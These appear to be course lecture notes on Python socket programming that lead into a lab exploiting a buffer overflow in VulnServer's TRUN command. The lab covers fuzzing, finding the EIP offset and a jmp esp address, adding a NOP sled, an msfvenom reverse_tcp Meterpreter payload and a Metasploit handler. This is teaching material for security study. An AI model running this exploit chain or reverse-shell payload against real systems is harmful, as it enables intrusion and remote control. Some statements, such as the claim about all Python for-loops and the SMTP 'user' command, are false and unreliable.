# Python and Network Security Concepts

## 1. Running a Python Script with Arguments
When you run the Python script `print_name.py` with the command `python print_name.py Rob 6`, the arguments are passed as follows:
- `sys.argv[0]` would be `print_name.py`.
- `sys.argv[1]` would be `Rob`.
- `sys.argv[2]` would be `6`.

## 2. For-Loops in Python
All for-loops in Python specify the starting value, the termination value, and the increment. The syntax is as follows:

```python
for i in range(0, 10):
    print("Hello Rob")
```

## 3. Setting a Timeout on Sockets
The `.settimeout()` method allows the programmer to specify the maximum number of seconds before a socket throws a timeout exception.

Example:
```python
conn.settimeout(5)
```

## 4. Try/Except Blocks
### Syntax
```python
try:
    some_code
except:
    code_to_execute_on_any_error
```
or
```python
try:
    some_code
except socket.timeout:
    code_to_execute_on_socket_timeout_error
```

### Common Socket Errors
- **socket.error**: Thrown when a connected socket receives an RST.
- **socket.timeout**: Thrown after a socket waits for a specified number of seconds without receiving data.

## 5. Writing a Port Scanner
See `port-scanner.py` for an example.

## 6. Fuzzing
### Sending Data Over a Socket
The `.send()` function transmits data over an already connected socket. It is up to the destination to process that data appropriately.

Example:
```python
conn.send("Rob 6")  # Sends a five-character sequence to the destination.
```

### Interacting with a Network Service
Most network service commands have the following syntax:
```plaintext
\r\n
```
For example, specifying a user over SMTP uses the `user` command:
```plaintext
user rob\r\n
```

### Fuzzing
Fuzzing is the process of trying incrementally more malicious input until the application crashes. For example, you could fuzz the SMTP `user` command to provoke a buffer overflow by trying longer and longer usernames:

```python
for i in range(0, 10000, 10):
    badname = "A" * i
    conn.send(f"user {badname}\r\n")
```

This will try usernames (of all 'A's) between length 0 and length 10000 at increments of 10.

### Writing a Fuzzer
We will be fuzzing the TRUN command on VulnServer. Note that TRUN is only vulnerable to a buffer overflow when the command’s argument is pre-faced with a period. See `fuzzer.py` for an example.

### Observing a Crash in Immunity
While observing a crash in Immunity, pay attention to the `eip` value. This will indicate what part of your malicious input is overwriting the saved instruction address on the stack. When the vulnerable function returns, your malicious input will be removed from the stack and loaded into the instruction pointer as if it were a real instruction’s address.

## 7. Taking Control of a Crash
### Fine-Tuning Your Crash
To know precisely where a crash occurs and which bytes overwrite the saved instruction address, you can fine-tune the fuzzer by removing the for loop and adding differentiation to the malicious input. For example, if the overflow causes a crash at 70 bytes, you might use the following malicious string:

```python
badstr = "A" * 70 + "B" * 4 + "C" * 10
```

If you observe any `\x41` values in the `eip` register, you have too much "garbage" and should adjust it. If you observe any `\x43` values, you don’t have enough "garbage" and should adjust it. The goal is to fine-tune the exploit until your `eip` register reads `\x42\x42\x42\x42` during a crash.

### Locating a Jump Instruction
This exploit requires a jump instruction that routes code execution to the top of the stack (`jmp esp`). Use Immunity Debugger's search tool to find such instructions. Note that addresses need to be reversed due to little-endian architecture. If Immunity indicates a jump instruction at address `12345678`, you would insert it as follows:

```python
eip = "\x78\x56\x34\x12"
```

Use the module viewer tool in Immunity to find modules without ASLR. For VulnServer, `vulnserver.exe` and `essfunc.dll` do not load with ASLR and either can be used. However, `vulnserver.exe` does not have any `jmp esp` instructions.

### Adding a NOP Sled
In reality, additional control data may be saved when a function call occurs. To handle this, include a NOP sled. NOP is the assembly instruction for "no operation." By inserting a sequence of NOPs between the jump address and the payload, you can ensure the payload will be executed.

## 8. Completing the Exploit
### Generating a Payload
A reverse-tcp meterpreter stager payload can be generated using the following bash command:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=8421 -b \x00 -e x86/shikata_ga_nai -f python
```

- `-p`: Specifies the payload.
- `LHOST` and `LPORT`: Arguments to the meterpreter payload. `LHOST` must be the IP of your Kali VM.
- `-b`: References bytes that cannot appear in the shellcode (e.g., `\x00`).
- `-e`: Specifies the encoding scheme of the payload.
- `-f`: Specifies the language of the exploit.

Once the payload is generated, append it to the malicious string after the NOP sled. The structure of your malicious string should be:

```python
garbage = "A" * 2006
eip = "\xAF\x11\x50\x62"
nop_sled = "\x90" * 24
buf = ""
buf += <generated_payload>
badstr = garbage + eip + nop_sled + buf + "\r\n"
```

### Setting a Handler
In a separate terminal tab, run the following commands in the Metasploit console:

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <your_IP>
set lport 8421
exploit
```

### Exploitation
Run your exploit script. Your Meterpreter handler should tell you that you have an open Meterpreter session. See `exploit.py` for an example.

## 9. Writing Custom Payloads (As Time Permits)
See `custom-payload-calc.py` and `custom-payload-add-user.py` for examples.

## 10. References
A list of references can be found in the GitHub repository listed at the beginning of the lecture notes.